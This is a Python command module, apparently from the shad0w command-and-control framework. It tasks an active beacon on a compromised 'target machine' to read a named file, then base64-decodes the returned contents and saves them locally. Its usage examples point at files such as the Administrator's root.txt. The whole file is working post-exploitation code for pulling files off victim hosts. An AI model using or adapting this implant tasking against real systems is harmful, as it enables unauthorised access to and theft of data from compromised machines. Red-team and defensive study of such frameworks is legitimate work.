# 
# Display the contents of a file
#
import os
import sys
import base64
import argparse

__description__ = "Display the contents of a file on the target machine"
__author__ = "@_batsec_"

EXEC_ID   = 0x4000
OPCODE_LS = 0x2000

count = 0
ERROR = False
error_list = ""

# let argparse error and exit nice
def error(message):
    global ERROR, error_list
    ERROR = True
    error_list += f"\033[0;31m{message}\033[0m\n"

def exit(status=0, message=None): 
    if message != None: print(message)
    return

def cat_callback(shad0w, data):
    global count

    count += 1
    shad0w.beacons[shad0w.current_beacon]["callback"] = None

    shad0w.debug.good(f"Downloading 'File' ({len(data)} bytes)")

    bdir = os.getcwd()
    os.chdir("./.bridge")

    with open("File"+str(count), 'wb') as file:
        file.write(base64.b64decode(data))

    # change the dir to our root
    os.chdir(bdir)

    shad0w.debug.good(f"Downloaded")

    return ""

    #shad0w.debug.log(data, log=True, pre=False)

def main(shad0w, args):
    
    # check we actually have a beacon
    if shad0w.current_beacon is None:
        shad0w.debug.error("ERROR: No active beacon")
        return
    
    # usage examples
    usage_examples = """
Don't try to cat binary files, it doesnt work very well.

Examples:

cat C:\\Users\\Administrator\\root.txt
cat C:\\Users\\thejoker\\Desktop\\evil_plans.txt
"""

    # init the parser
    parse = argparse.ArgumentParser(prog='cat',
                                formatter_class=argparse.RawDescriptionHelpFormatter,
                                epilog=usage_examples)
    
    # keep it behaving nice
    parse.exit = exit
    parse.error = error

    # setup the args
    parse.add_argument("file", nargs='*', help="file you want to display the contents of")

    # make sure we dont die from weird args
    try:
        args = parse.parse_args(args[1:])
    except:
        pass
    
    # we need a file to read so if we dont then fail
    if len(args.file) == 0:
        print(error_list) 
        parse.print_help()
        return
    
    # clean it up
    read_file = ' '.join(args.file).replace('\\', "\\\\").replace('"', '')

    # set a task for the current beacon to do
    shad0w.beacons[shad0w.current_beacon]["callback"] = cat_callback
    shad0w.beacons[shad0w.current_beacon]["task"] = "UPD "+read_file